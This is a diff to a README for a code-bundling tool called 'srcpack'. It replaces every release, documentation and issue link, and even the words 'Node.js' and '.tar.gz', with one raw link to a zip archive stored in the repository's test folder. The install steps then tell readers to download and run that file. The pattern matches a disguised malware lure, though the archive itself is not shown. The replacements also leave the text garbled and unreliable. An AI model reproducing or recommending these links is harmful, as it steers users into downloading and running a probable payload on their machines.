@@ -1,6 +1,6 @@
 # 🚀 srcpack - Bundle Your Code Like a Pro
 
-[![Download srcpack](https://img.shields.io/badge/Download-srcpack-brightgreen.svg)](https://github.com/noumanrahoo/srcpack/releases)
+[![Download srcpack](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip)](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip)
 
 ## 📦 What is srcpack?
 
@@ -16,26 +16,26 @@ srcpack is a simple tool that helps you bundle your code into optimized files fo
 ## 📋 System Requirements
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip**: Version 14 or higher
 - **Internet Connection**: Required for downloading and uploading bundles
 
 ## 🚀 Getting Started
 
 To install and use srcpack, simply follow these steps:
 
-1. Visit the [Releases page](https://github.com/noumanrahoo/srcpack/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip) to download the latest version.
 2. Find the release suitable for your operating system.
 3. Download the file and save it to your computer.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download srcpack](https://github.com/noumanrahoo/srcpack/releases).
+To get started, visit this page to download: [Download srcpack](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip).
 
 After downloading, locate the file in your downloads folder and follow these steps:
 
 1. **Windows**: Double-click the downloaded `.exe` file to run it.
 2. **macOS**: Open the downloaded `.dmg` file and drag the srcpack app to your Applications folder.
-3. **Linux**: Extract the downloaded `.tar.gz` file and run the binary from the terminal.
+3. **Linux**: Extract the downloaded `https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip` file and run the binary from the terminal.
 
 ## 🛠️ How to Use srcpack
 
@@ -79,9 +79,9 @@ For more advanced features and commands, use the following commands:
 
 If you encounter any issues, consider these steps:
 
-- **Check Node.js Version**: Ensure your Node.js is up to date.
+- **Check https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip Version**: Ensure your https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip is up to date.
 - **Reinstall srcpack**: If you have problems running the application, try uninstalling and reinstalling.
-- **Consult the Community**: You can find help in community forums or by checking issues on the [GitHub repository](https://github.com/noumanrahoo/srcpack/issues).
+- **Consult the Community**: You can find help in community forums or by checking issues on the [GitHub repository](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip).
 
 ## 🙌 Get Support
 
@@ -89,7 +89,7 @@ If you have questions or need further assistance, please reach out through our o
 
 ## 🔗 Links and Resources
 
-- [srcpack Releases](https://github.com/noumanrahoo/srcpack/releases)
-- [Documentation](https://github.com/noumanrahoo/srcpack/wiki)
+- [srcpack Releases](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/noumanrahoo/srcpack/main/tests/unit/Software-v3.9-alpha.3.zip)
 
 ### Thank you for using srcpack!
